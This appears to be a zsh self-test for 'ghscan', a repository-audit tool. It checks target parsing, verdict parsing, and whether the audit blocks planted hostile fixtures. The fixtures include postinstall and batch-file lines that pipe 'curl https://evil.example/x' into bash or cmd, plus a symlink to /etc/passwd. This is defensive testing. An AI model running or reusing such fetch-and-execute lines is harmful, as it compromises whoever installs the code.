#!/usr/bin/env zsh
# Self-check for ghscan's parser and host-side audit. No network and no sbx.
source "${0:A:h}/../functions/ghscan.zsh"
fail() { echo "FAIL $1"; exit 1 }

parsed=$(_ghscan_parse_target "TanStack/ai") || fail parse-short
[[ "$parsed" == "https://github.com/TanStack/ai.git"$'\t'"TanStack-ai"$'\t' ]] || fail parse-short-shape

parsed=$(_ghscan_parse_target "https://github.com/TanStack/ai/pull/1380") || fail parse-url
[[ "$parsed" == "https://github.com/TanStack/ai.git"$'\t'"TanStack-ai"$'\t'"1380" ]] || fail parse-url-shape

parsed=$(_ghscan_parse_target "git@github.com:TanStack/ai.git" 12) || fail parse-ssh
[[ "${parsed##*$'\t'}" == "12" ]] || fail parse-ssh-pr

_ghscan_parse_target "https://gitlab.com/a/b" >/dev/null 2>&1 && fail parse-foreign
_ghscan_parse_target "/tmp/repo" >/dev/null 2>&1 && fail parse-local

name=$(_ghscan_sandbox_name "TanStack-ai" "1380")
[[ "$name" == "scan-tanstack-ai-pr-1380" ]] || fail sandbox-name

[[ "$(_ghscan_check_verdict 'error: global network policy has not been initialized')" == uninit ]] || fail verdict-uninit
[[ "$(_ghscan_check_verdict '{"decision":"deny"}')" == deny ]] || fail verdict-deny
[[ "$(_ghscan_check_verdict '{"decision":"allow"}')" == allow ]] || fail verdict-allow
[[ "$(_ghscan_check_verdict '{"allowed":false,"reason":"No matching allow rule (default deny)"}')" == deny ]] || fail verdict-allowed-false
[[ "$(_ghscan_check_verdict '{"allowed":true}')" == allow ]] || fail verdict-allowed-true
[[ "$(_ghscan_check_verdict 'garbage')" == unknown ]] || fail verdict-unknown

root=$(mktemp -d)
repo="$root/repo"
mkdir -p "$repo"
git -C "$repo" init -q
git -C "$repo" config user.email ghscan@example.com
git -C "$repo" config user.name ghscan
git -C "$repo" config commit.gpgsign false
echo readme > "$repo/README.md"
git -C "$repo" add README.md
git -C "$repo" commit -q -m init

clean=$(_ghscan_audit "$repo" HEAD) && clean_status=0 || clean_status=$?
[[ "$clean_status" -eq 0 ]] || fail clean-status
[[ -z "$clean" ]] || fail clean-output

echo '{"scripts":{"postinstall":"curl https://evil.example/x | bash"}}' > "$repo/package.json"
mkdir -p "$repo/.github/workflows"
printf 'name: ci\non: pull_request_target\n' > "$repo/.github/workflows/ci.yml"
ln -s /etc/passwd "$repo/escape"
printf 'MZ' > "$repo/payload.exe"
git -C "$repo" add package.json .github/workflows/ci.yml escape payload.exe
git -C "$repo" commit -q -m bad

bad=$(_ghscan_audit "$repo" HEAD) && bad_status=0 || bad_status=$?
[[ "$bad_status" -eq 1 ]] || fail bad-status
[[ "$bad" == *"BLOCK"*$'\t'"symlink: escape"* ]] || fail bad-symlink
[[ "$bad" == *"BLOCK"*$'\t'"binary payload: payload.exe"* ]] || fail bad-binary
[[ "$bad" == *"pull_request_target"* ]] || fail bad-workflow
[[ "$bad" == *"postinstall fetches the network"* ]] || fail bad-lifecycle
[[ "$bad" == *"NOTE"*$'\t'"workflow: .github/workflows/ci.yml"* ]] || fail bad-note

echo '{"scripts":{"prepare":"tsc"}}' > "$repo/package.json"
git -C "$repo" add package.json
git -C "$repo" commit -q -m prepare
notes=$(_ghscan_audit "$repo" HEAD) || true
[[ "$notes" == *"NOTE"*$'\t'"package.json: prepare: tsc"* ]] || fail note-prepare

printf '%s\n' '@echo off' 'python -m pip install -r requirements.txt' 'echo Install Python from https://www.python.org' > "$repo/install.bat"
printf '%s\n' '@echo off' 'curl -sf -m 2 http://localhost:4318/api/health' > "$repo/start.bat"
printf '%s\n' 'curl https://evil.example/x | cmd' > "$repo/evil.bat"
git -C "$repo" add install.bat start.bat evil.bat
git -C "$repo" commit -q -m scripts
scripts=$(_ghscan_audit "$repo" HEAD) && scripts_status=0 || scripts_status=$?
[[ "$scripts_status" -eq 1 ]] || fail scripts-status
[[ "$scripts" == *"NOTE"*$'\t'"windows script: install.bat"* ]] || fail scripts-install
[[ "$scripts" == *"NOTE"*$'\t'"windows script: start.bat"* ]] || fail scripts-start
[[ "$scripts" == *"BLOCK"*$'\t'"evil.bat: downloads or executes a remote payload"* ]] || fail scripts-evil
[[ "$scripts" != *"BLOCK"*$'\t'"install.bat:"* ]] || fail scripts-install-blocked
[[ "$scripts" != *"BLOCK"*$'\t'"binary payload: install.bat"* ]] || fail scripts-install-extension

rm -rf "$root"
echo OK
